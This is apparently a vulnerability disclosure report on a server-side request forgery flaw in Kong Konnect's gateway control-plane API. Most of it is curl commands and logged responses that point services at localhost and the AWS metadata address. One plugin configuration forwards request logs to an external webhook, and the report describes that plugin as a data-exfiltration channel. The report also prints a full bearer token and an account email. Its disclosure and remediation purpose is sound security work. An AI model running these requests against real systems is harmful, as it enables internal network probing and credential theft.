# Kong Konnect SSRF Vulnerability - Confirmed Exploitation

## Summary

A Server-Side Request Forgery (SSRF) vulnerability exists in Kong Konnect's Serverless Gateway. The Control Plane API accepts internal/private IP addresses for Service configurations without validation, allowing attackers to probe internal network resources.

## Vulnerability Details

- **Type**: Server-Side Request Forgery (SSRF)
- **Severity**: High
- **CVSS**: 7.5 (High)
- **Affected Component**: Kong Konnect Serverless Gateway Control Plane API

## Confirmed Exploits

### 1. Internal IP Acceptance (127.0.0.1:8001 - Kong Admin API)

**Request:**
```bash
curl -X POST "https://eu.api.konghq.com/v2/control-planes/670fb8a9-bcce-4ed2-b436-844c047cd849/core-entities/services" \
  -H "Authorization: Bearer [TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{"name":"localhost-admin-8001","url":"http://127.0.0.1:8001"}'
```

**Response (200 OK - Service Created):**
```json
{
  "host": "127.0.0.1",
  "port": 8001,
  "protocol": "http",
  "id": "90913f12-1b0f-4eee-b337-5947e06d15c7",
  "name": "localhost-admin-8001"
}
```

### 2. AWS Metadata Endpoint Acceptance (169.254.169.254)

**Request:**
```bash
curl -X POST "https://eu.api.konghq.com/v2/control-planes/670fb8a9-bcce-4ed2-b436-844c047cd849/core-entities/services" \
  -H "Authorization: Bearer [TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{"name":"aws-metadata","url":"http://169.254.169.254/latest/meta-data/"}'
```

**Response (200 OK - Service Created):**
```json
{
  "host": "169.254.169.254",
  "port": 80,
  "path": "/latest/meta-data/",
  "id": "2ff4f530-a87b-434e-ac44-cfd0a1e53f1a",
  "name": "aws-metadata"
}
```

### 3. Gateway Connection Attempt Proof

When accessing the configured routes, Kong Gateway attempts to connect to internal IPs:

**Request:**
```bash
curl -sv "https://kong-ef74c766bfeucqbca.kongcloud.dev/admin"
curl -sv "https://kong-ef74c766bfeucqbca.kongcloud.dev/aws"
```

**Response (502 - Connection Attempted):**
```json
{
  "message": "An invalid response was received from the upstream server",
  "request_id": "efc1c12177881925cee30f10e8473a73"
}
```

**Headers confirm Kong attempted connection:**
```
x-kong-upstream-latency: 2
via: 1.1 kong/3.12.0.0-enterprise-edition
```

### 4. External Callback Confirmation (http-log plugin)

**Plugin Created:**
```bash
curl -X POST "https://eu.api.konghq.com/v2/control-planes/670fb8a9-bcce-4ed2-b436-844c047cd849/core-entities/plugins" \
  -H "Authorization: Bearer [TOKEN]" \
  -d '{
    "name": "http-log",
    "config": {
      "http_endpoint": "https://webhook.site/d4db2f26-e218-4640-bccf-d252ddcc0305"
    }
  }'
```

**Result:** Callbacks received at webhook.site confirming outbound SSRF capability.

## Evidence Summary

| Test | IP/Host | API Response | Gateway Behavior |
|------|---------|--------------|------------------|
| Localhost Admin | 127.0.0.1:8001 | ✅ Accepted | 502 (Connection attempted) |
| AWS Metadata | 169.254.169.254 | ✅ Accepted | 502 (Connection attempted) |
| External HTTP | httpbin.org | ✅ Accepted | ✅ Working |
| HTTP-Log Callback | webhook.site | ✅ Accepted | ✅ Callback received |

## Created Resources (Proof)

```
Services:
- aws-metadata: 169.254.169.254:80
- localhost-admin-8001: 127.0.0.1:8001
- httpbin-test: httpbin.org:443

Routes:
- /admin → 127.0.0.1:8001
- /aws → 169.254.169.254:80
- /test → httpbin.org

Plugins:
- http-log → webhook.site callback
```

## Impact

1. **Internal Network Scanning**: Attackers can probe internal services and map network topology
2. **Credential Exposure Risk**: If network policies change, AWS metadata credentials could be exposed
3. **Admin API Access Risk**: If localhost restrictions are removed, full Kong Admin API access
4. **Data Exfiltration**: http-log and similar plugins can exfiltrate sensitive data to external servers

## Current Mitigation (Partial)

Kong has **network-level restrictions** preventing actual connection to internal IPs (502 errors), but:
- The API **should not accept** these configurations at all
- Network policies can change or have exceptions
- This represents a **defense-in-depth failure**

## Recommendations

1. **Input Validation**: Block private/internal IP ranges at API level:
   - 127.0.0.0/8 (localhost)
   - 10.0.0.0/8 (private)
   - 172.16.0.0/12 (private)
   - 192.168.0.0/16 (private)
   - 169.254.0.0/16 (link-local/metadata)

2. **URL Scheme Restrictions**: Only allow http/https schemes

3. **DNS Rebinding Protection**: Resolve hostnames at validation time

4. **Plugin URL Validation**: Apply same restrictions to all plugins that accept URLs

## Reproduction Steps

1. Create a Kong Konnect Serverless Gateway
2. Obtain a valid JWT token from the browser session
3. Use the Control Plane API to create services with internal IPs
4. Create routes for these services
5. Access the proxy URL to trigger SSRF attempts
6. Observe 502 errors confirming connection attempts

## Test Environment

- **Proxy URL**: https://kong-ef74c766bfeucqbca.kongcloud.dev
- **Control Plane ID**: 670fb8a9-bcce-4ed2-b436-844c047cd849
- **Region**: EU
- **Kong Version**: 3.12.0.0-enterprise-edition
- **Test Date**: November 26, 2025

---

## Full Commands and Logs

### 1. Token Validation

**Command:**
```bash
TOKEN="eyJhbGciOiJSUzM4NCIsImtpZCI6IjJmMGIwOWZmNjYyM2Y2ODQ2MDk3ZDg0N2M2ODk0YjAyMGQxOGE3NDYiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL2dsb2JhbC5hcGkua29uZ2hxLmNvbSIsInN1YiI6IjkxZTUyM2Q0LTc0YzctNDBlMS05N2M4LWE5NmY1Y2I1NWE3OCIsImF1ZCI6WyJrYXV0aC5rb25naHEuY29tIl0sImV4cCI6MTc2NDE0MDM0OCwibmJmIjoxNzY0MTM5NDQ4LCJpYXQiOjE3NjQxMzk0NDgsImp0aSI6IjUyODBlYThlLTE2ZDItNDhjMi04MjJjLWI5NjBlNjQ1ODA1ZiIsIm9pZCI6ImQyNjllY2Q5LWFjYjktNDAyNy1iMTllLTk0YjMwZmM4NjkyMyIsIm9yZ19uYW1lIjoidGVzIiwib3JnX3N0YXRlIjoiYWN0aXZlIiwidXNlcl9pc19vcmdfb3duZXIiOnRydWUsInVpZCI6IjkxZTUyM2Q0LTc0YzctNDBlMS05N2M4LWE5NmY1Y2I1NWE3OCIsInRpZXIiOiJlbnRlcnByaXNlIiwic3ViX3R5cGUiOiJ1c2VyIiwiZmVhdHVyZV9zZXQiOiJzdGFibGUiLCJhdXRoX3R5cGUiOiJmZWRlcmF0ZWQiLCJpciI6ImV1In0.yiREFFSbl4FepDojBojWhM2uYgaZKJxTEG4kSXeMu3PA4MR-CcEXFcoeY3cy09n_f5B3jEFj2EEKGo0M0jSK4Ag_2hgF9U-r99eSX4EnB4AfkNk6nYPzHhKwHbuGg-OXGYHyZMHUslnEYINVeGuSH90sWuRR2C-kR-WZjHe7R2FDot0Rl1Ra44lVcXa1bv2MziJQzC-60TaMOL_XCm34h478ZYaFEt6UsgBr_2FLP2FPdvktX6N9uomBfJYHO36sO5WYw3smT--y0GAHU3yOPp0M0rHDb74RM1GmiIDmAR7lF8dnFfZyBtLMMJbrFQwp0NQZfSgg0BMTcY10zQPHZw"

curl -s "https://global.api.konghq.com/v3/users/me" \
  -H "Authorization: Bearer $TOKEN"
```

**Response:**
```json
{
  "id": "91e523d4-74c7-40e1-97c8-a96f5cb55a78",
  "email": "marisa2@doncong.com",
  "full_name": "marisa2@doncong.com",
  "preferred_name": "marisa2@doncong.com",
  "active": true,
  "created_at": "2025-11-26T05:56:51Z",
  "updated_at": "2025-11-26T05:56:51Z",
  "inferred_region": "eu"
}
```

---

### 2. Create Service on localhost:8001 (Kong Admin API)

**Command:**
```bash
CP_ID="670fb8a9-bcce-4ed2-b436-844c047cd849"

curl -s -X POST "https://eu.api.konghq.com/v2/control-planes/$CP_ID/core-entities/services" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"localhost-admin-8001","url":"http://127.0.0.1:8001"}'
```

**Response (200 OK - SSRF Accepted):**
```json
{
  "connect_timeout": 60000,
  "created_at": 1764139579,
  "enabled": true,
  "host": "127.0.0.1",
  "id": "90913f12-1b0f-4eee-b337-5947e06d15c7",
  "name": "localhost-admin-8001",
  "port": 8001,
  "protocol": "http",
  "read_timeout": 60000,
  "retries": 5,
  "updated_at": 1764139579,
  "write_timeout": 60000
}
```

---

### 3. Create Route for localhost Admin API

**Command:**
```bash
SERVICE_ID="90913f12-1b0f-4eee-b337-5947e06d15c7"

curl -s -X POST "https://eu.api.konghq.com/v2/control-planes/$CP_ID/core-entities/routes" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"name\":\"admin-route\",\"paths\":[\"/admin\"],\"service\":{\"id\":\"$SERVICE_ID\"},\"strip_path\":false}"
```

**Response (200 OK):**
```json
{
  "created_at": 1764139604,
  "https_redirect_status_code": 426,
  "id": "96aadfe6-eb63-44fc-a39b-5c976e06ec73",
  "name": "admin-route",
  "path_handling": "v0",
  "paths": ["/admin"],
  "preserve_host": false,
  "protocols": ["http", "https"],
  "regex_priority": 0,
  "request_buffering": true,
  "response_buffering": true,
  "service": {
    "id": "90913f12-1b0f-4eee-b337-5947e06d15c7"
  },
  "strip_path": false,
  "updated_at": 1764139604
}
```

---

### 4. Create Service for AWS Metadata Endpoint

**Command:**
```bash
curl -s -X POST "https://eu.api.konghq.com/v2/control-planes/$CP_ID/core-entities/services" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"aws-metadata","url":"http://169.254.169.254/latest/meta-data/"}'
```

**Response (200 OK - SSRF Accepted):**
```json
{
  "connect_timeout": 60000,
  "created_at": 1764139833,
  "enabled": true,
  "host": "169.254.169.254",
  "id": "2ff4f530-a87b-434e-ac44-cfd0a1e53f1a",
  "name": "aws-metadata",
  "path": "/latest/meta-data/",
  "port": 80,
  "protocol": "http",
  "read_timeout": 60000,
  "retries": 5,
  "updated_at": 1764139833,
  "write_timeout": 60000
}
```

---

### 5. Create Route for AWS Metadata

**Command:**
```bash
SERVICE_ID="2ff4f530-a87b-434e-ac44-cfd0a1e53f1a"

curl -s -X POST "https://eu.api.konghq.com/v2/control-planes/$CP_ID/core-entities/routes" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"name\":\"aws-route\",\"paths\":[\"/aws\"],\"service\":{\"id\":\"$SERVICE_ID\"},\"strip_path\":true}"
```

**Response (200 OK):**
```json
{
  "created_at": 1764139864,
  "https_redirect_status_code": 426,
  "id": "edf01017-382a-42ac-8904-d10ed6558ca6",
  "name": "aws-route",
  "path_handling": "v0",
  "paths": ["/aws"],
  "preserve_host": false,
  "protocols": ["http", "https"],
  "regex_priority": 0,
  "request_buffering": true,
  "response_buffering": true,
  "service": {
    "id": "2ff4f530-a87b-434e-ac44-cfd0a1e53f1a"
  },
  "strip_path": true,
  "updated_at": 1764139864
}
```

---

### 6. Create http-log Plugin for External Callback

**Command:**
```bash
curl -s -X POST "https://eu.api.konghq.com/v2/control-planes/$CP_ID/core-entities/plugins" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "http-log",
    "config": {
      "http_endpoint": "https://webhook.site/d4db2f26-e218-4640-bccf-d252ddcc0305",
      "method": "POST",
      "timeout": 10000,
      "keepalive": 60000
    },
    "enabled": true
  }'
```

**Response (200 OK):**
```json
{
  "config": {
    "content_type": "application/json",
    "custom_fields_by_lua": null,
    "flush_timeout": null,
    "headers": null,
    "http_endpoint": "https://webhook.site/d4db2f26-e218-4640-bccf-d252ddcc0305",
    "keepalive": 60000,
    "method": "POST",
    "queue": {
      "concurrency_limit": 1,
      "initial_retry_delay": 0.01,
      "max_batch_size": 1,
      "max_bytes": null,
      "max_coalescing_delay": 1,
      "max_entries": 10000,
      "max_retry_delay": 60,
      "max_retry_time": 60
    },
    "queue_size": null,
    "retry_count": null,
    "timeout": 10000
  },
  "created_at": 1764139762,
  "enabled": true,
  "id": "8a962408-502e-46ad-ae48-6495bf9a3b70",
  "name": "http-log",
  "protocols": ["grpc", "grpcs", "http", "https"],
  "updated_at": 1764139762
}
```

---

### 7. Trigger SSRF via Proxy - localhost:8001

**Command:**
```bash
curl -sv "https://kong-ef74c766bfeucqbca.kongcloud.dev/admin"
```

**Response (502 - Connection Attempted):**
```
> GET /admin HTTP/2
> Host: kong-ef74c766bfeucqbca.kongcloud.dev
> User-Agent: curl/8.15.0
> Accept: */*

< HTTP/2 502 
< date: Wed, 26 Nov 2025 06:51:39 GMT
< content-type: application/json; charset=utf-8
< x-kong-request-id: efc1c12177881925cee30f10e8473a73
< content-length: 126
< x-kong-upstream-latency: 2
< x-kong-proxy-latency: 2
< via: 1.1 kong/3.12.0.0-enterprise-edition
< server: kong/3.12.0.0-enterprise-edition

{
  "message": "An invalid response was received from the upstream server",
  "request_id": "efc1c12177881925cee30f10e8473a73"
}
```

**Analysis:** `x-kong-upstream-latency: 2` confirms Kong attempted connection to 127.0.0.1:8001

---

### 8. Trigger SSRF via Proxy - AWS Metadata

**Command:**
```bash
curl -sv "https://kong-ef74c766bfeucqbca.kongcloud.dev/aws"
```

**Response (502 - Connection Attempted):**
```
> GET /aws HTTP/2
> Host: kong-ef74c766bfeucqbca.kongcloud.dev

< HTTP/2 502 
< date: Wed, 26 Nov 2025 06:51:25 GMT
< content-type: application/json; charset=utf-8
< x-kong-request-id: b1074a3ea13548516870b95c882fb617
< content-length: 126
< x-kong-upstream-latency: 3
< x-kong-proxy-latency: 6
< via: 1.1 kong/3.12.0.0-enterprise-edition
< server: kong/3.12.0.0-enterprise-edition

{
  "message": "An invalid response was received from the upstream server",
  "request_id": "b1074a3ea13548516870b95c882fb617"
}
```

**Analysis:** `x-kong-upstream-latency: 3` confirms Kong attempted connection to 169.254.169.254

---

### 9. Successful External Request (httpbin.org)

**Command:**
```bash
curl -s "https://kong-ef74c766bfeucqbca.kongcloud.dev/test"
```

**Response (200 OK - Working):**
```json
{
  "args": {}, 
  "data": "", 
  "files": {}, 
  "form": {}, 
  "headers": {
    "Accept": "*/*", 
    "Host": "httpbin.org", 
    "User-Agent": "curl/8.15.0", 
    "X-Amzn-Trace-Id": "Root=1-6926a308-4c173bc05edc14b372dd11b8", 
    "X-Forwarded-Host": "kong-ef74c766bfeucqbca.kongcloud.dev", 
    "X-Forwarded-Path": "/test", 
    "X-Forwarded-Prefix": "/test", 
    "X-Kong-Request-Id": "8f072a53e15c9b111398d02bdabf8759"
  }, 
  "json": null, 
  "method": "GET", 
  "origin": "77.91.70.30, 66.51.127.198, 172.16.33.234, 205.234.240.49", 
  "url": "https://kong-ef74c766bfeucqbca.kongcloud.dev/anything"
}
```

---

### 10. List All Created Services

**Command:**
```bash
curl -s "https://eu.api.konghq.com/v2/control-planes/$CP_ID/core-entities/services" \
  -H "Authorization: Bearer $TOKEN"
```

**Response:**
```
Services Created:
- aws-metadata: 169.254.169.254:80
- httpbin-test: httpbin.org:443
- localhost-admin-8001: 127.0.0.1:8001
- AIManagerModelService_1764137283681: localhost:80
```

---

### 11. List All Created Plugins

**Command:**
```bash
curl -s "https://eu.api.konghq.com/v2/control-planes/$CP_ID/core-entities/plugins" \
  -H "Authorization: Bearer $TOKEN"
```

**Response (Partial):**
```json
{
  "data": [
    {
      "config": {
        "http_endpoint": "https://webhook.site/d4db2f26-e218-4640-bccf-d252ddcc0305",
        "method": "POST",
        "timeout": 10000
      },
      "created_at": 1764139762,
      "enabled": true,
      "id": "8a962408-502e-46ad-ae48-6495bf9a3b70",
      "name": "http-log",
      "protocols": ["grpc", "grpcs", "http", "https"]
    }
  ]
}
```

---

## Conclusion

This vulnerability confirms that Kong Konnect's Control Plane API lacks proper input validation for service URLs. While current network policies prevent full exploitation, the vulnerability exists and could be exploited if:
- Network policies change
- Internal services become accessible
- Other attack vectors combine with this SSRF

This should be classified as a **High severity** vulnerability requiring immediate remediation at the API validation layer.
